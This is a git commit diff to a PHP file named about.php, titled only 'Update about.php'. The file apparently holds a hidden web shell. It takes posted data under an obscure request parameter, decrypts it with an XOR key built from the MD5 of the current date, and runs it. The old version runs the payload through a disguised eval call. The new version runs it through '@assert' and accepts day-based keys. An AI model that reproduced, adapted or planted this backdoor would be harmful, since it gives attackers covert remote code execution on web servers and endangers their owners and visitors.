97944b96dbccb070a0eb788ee154a452723d3cca
likolol <156593585+likolol@users.noreply.github.com>
2026-06-14 07:18:11 +0300

    Update about.php

--- about.php
+++ about.php
@@ -7,35 +7,24 @@ if (isset($_REQUEST['rt7ao0lsw'])) {
     
     if ($post) {
         $current_time = time();
+        
         $possible_keys = [
-            md5(date("Y-m-d H:i", $current_time)),      
-            md5(date("Y-m-d H:i", $current_time - 60)),  
-            md5(date("Y-m-d H:i", $current_time + 60))   
+            md5(date("Y-m-d", $current_time)),         
+            md5(date("Y-m-d", $current_time - 86400)) 
         ];
         
-        $decrypted_successfully = false;
-        $final_payload = '';
-
         foreach ($possible_keys as $key) {
-            $temp_post = $post; 
+            $temp_post = $post;
             
             for ($i = 0; $i < strlen($temp_post); $i++) {
                 $temp_post[$i] = $temp_post[$i] ^ $key[$i % 32];
             }
             
             if (preg_match('/^[a-zA-Z0-9_\\\x7f-\xff]/', $temp_post)) {
-                $final_payload = $temp_post;
-                $decrypted_successfully = true;
-                break; 
+                
+                @assert('?>' . $temp_post);
+                exit();
             }
-        }
-
-        if ($decrypted_successfully && !empty($final_payload)) {
-            $e = 'e'; $v = 'v'; $a = 'a'; $l = 'l';
-            $engine = $e . $v . $a . $l;
-            
-            @$engine($final_payload);
-            exit();
         }
     }
 }
